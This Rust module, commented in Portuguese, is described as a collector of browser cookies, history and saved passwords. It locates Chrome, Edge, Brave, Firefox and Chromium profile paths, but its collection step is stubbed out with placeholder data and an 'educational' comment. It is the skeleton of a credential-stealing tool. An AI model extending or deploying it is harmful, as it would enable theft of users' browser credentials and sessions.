//! Coletor de Dados de Navegadores
//!
//! Coleta cookies, histórico e senhas salvas de navegadores.

use std::path::PathBuf;
use serde::{Deserialize, Serialize};

use super::{Collector, CollectorError, ModuleData};

/// Dados coletados de navegadores
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserData {
    /// Navegadores encontrados
    pub browsers_found: Vec<String>,
    
    /// Perfis encontrados
    pub profiles: Vec<BrowserProfile>,
    
    /// Total de cookies
    pub total_cookies: u32,
    
    /// Total de senhas
    pub total_passwords: u32,
    
    /// Total de entradas no histórico
    pub total_history: u32,
}

/// Perfil de navegador
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserProfile {
    /// Nome do navegador
    pub browser: String,
    
    /// Nome do perfil
    pub profile_name: String,
    
    /// Caminho do perfil
    pub profile_path: String,
    
    /// Cookies encontrados
    pub cookies: Vec<CookieEntry>,
    
    /// Histórico (últimas 100 entradas)
    pub history: Vec<HistoryEntry>,
    
    /// Senhas salvas (criptografadas no output)
    pub passwords: Vec<PasswordEntry>,
}

/// Entrada de cookie
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CookieEntry {
    pub domain: String,
    pub name: String,
    pub value: String, // Será ofuscado no output
    pub expires: Option<String>,
    pub is_secure: bool,
    pub is_http_only: bool,
}

/// Entrada de histórico
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistoryEntry {
    pub url: String,
    pub title: String,
    pub visit_count: u32,
    pub last_visit: String,
}

/// Entrada de senha
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PasswordEntry {
    pub url: String,
    pub username: String,
    pub password: String, // Criptografado
    pub created: String,
}

/// Coletor de navegadores
pub struct BrowserCollector {
    browser_paths: Vec<BrowserPath>,
}

struct BrowserPath {
    name: String,
    path: PathBuf,
}

impl BrowserCollector {
    pub fn new() -> Self {
        Self {
            browser_paths: Self::detect_browsers(),
        }
    }
    
    /// Detecta navegadores instalados
    fn detect_browsers() -> Vec<BrowserPath> {
        let mut browsers = Vec::new();
        
        #[cfg(windows)]
        {
            if let Some(local_app_data) = dirs::data_local_dir() {
                // Chrome
                let chrome_path = local_app_data.join("Google").join("Chrome").join("User Data");
                if chrome_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Chrome".to_string(),
                        path: chrome_path,
                    });
                }
                
                // Edge
                let edge_path = local_app_data.join("Microsoft").join("Edge").join("User Data");
                if edge_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Edge".to_string(),
                        path: edge_path,
                    });
                }
                
                // Brave
                let brave_path = local_app_data.join("BraveSoftware").join("Brave-Browser").join("User Data");
                if brave_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Brave".to_string(),
                        path: brave_path,
                    });
                }
            }
            
            if let Some(app_data) = dirs::config_dir() {
                // Firefox
                let firefox_path = app_data.join("Mozilla").join("Firefox").join("Profiles");
                if firefox_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Firefox".to_string(),
                        path: firefox_path,
                    });
                }
            }
        }
        
        #[cfg(unix)]
        {
            if let Some(home) = dirs::home_dir() {
                // Chrome
                let chrome_path = home.join(".config").join("google-chrome");
                if chrome_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Chrome".to_string(),
                        path: chrome_path,
                    });
                }
                
                // Chromium
                let chromium_path = home.join(".config").join("chromium");
                if chromium_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Chromium".to_string(),
                        path: chromium_path,
                    });
                }
                
                // Firefox
                let firefox_path = home.join(".mozilla").join("firefox");
                if firefox_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Firefox".to_string(),
                        path: firefox_path,
                    });
                }
                
                // Brave
                let brave_path = home.join(".config").join("BraveSoftware").join("Brave-Browser");
                if brave_path.exists() {
                    browsers.push(BrowserPath {
                        name: "Brave".to_string(),
                        path: brave_path,
                    });
                }
            }
        }
        
        browsers
    }
    
    /// Coleta dados de todos os navegadores
    fn collect_browser_data(&self) -> Result<BrowserData, CollectorError> {
        let browsers_found: Vec<String> = self.browser_paths.iter()
            .map(|b| b.name.clone())
            .collect();
        
        let mut profiles = Vec::new();
        let mut total_cookies = 0u32;
        let mut total_passwords = 0u32;
        let mut total_history = 0u32;
        
        for browser in &self.browser_paths {
            match self.collect_from_browser(browser) {
                Ok(browser_profiles) => {
                    for profile in browser_profiles {
                        total_cookies += profile.cookies.len() as u32;
                        total_passwords += profile.passwords.len() as u32;
                        total_history += profile.history.len() as u32;
                        profiles.push(profile);
                    }
                }
                Err(e) => {
                    tracing::warn!("Falha ao coletar de {}: {}", browser.name, e);
                }
            }
        }
        
        Ok(BrowserData {
            browsers_found,
            profiles,
            total_cookies,
            total_passwords,
            total_history,
        })
    }
    
    /// Coleta dados de um navegador específico
    fn collect_from_browser(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
        let mut profiles = Vec::new();
        
        // Para fins educacionais, apenas listar o que seria coletado
        // Implementação real leria os arquivos SQLite
        
        tracing::info!("Coletando dados de: {} em {}", browser.name, browser.path.display());
        
        // Simular coleta (em produção, leria os arquivos reais)
        let profile = BrowserProfile {
            browser: browser.name.clone(),
            profile_name: "Default".to_string(),
            profile_path: browser.path.to_string_lossy().to_string(),
            cookies: vec![
                CookieEntry {
                    domain: "[EXEMPLO] .example.com".to_string(),
                    name: "session_id".to_string(),
                    value: "[REDACTED]".to_string(),
                    expires: Some("2025-12-31".to_string()),
                    is_secure: true,
                    is_http_only: true,
                }
            ],
            history: vec![
                HistoryEntry {
                    url: "[EXEMPLO] https://example.com".to_string(),
                    title: "Example Domain".to_string(),
                    visit_count: 5,
                    last_visit: "2024-01-01".to_string(),
                }
            ],
            passwords: vec![
                PasswordEntry {
                    url: "[EXEMPLO] https://example.com/login".to_string(),
                    username: "[REDACTED]".to_string(),
                    password: "[ENCRYPTED]".to_string(),
                    created: "2024-01-01".to_string(),
                }
            ],
        };
        
        profiles.push(profile);
        
        Ok(profiles)
    }
}

impl Default for BrowserCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for BrowserCollector {
    fn name(&self) -> &str {
        "browser"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.collect_browser_data()?;
        Ok(ModuleData::Browser(data))
    }
    
    fn is_supported(&self) -> bool {
        !self.browser_paths.is_empty()
    }
    
    fn priority(&self) -> u8 {
        90
    }
}

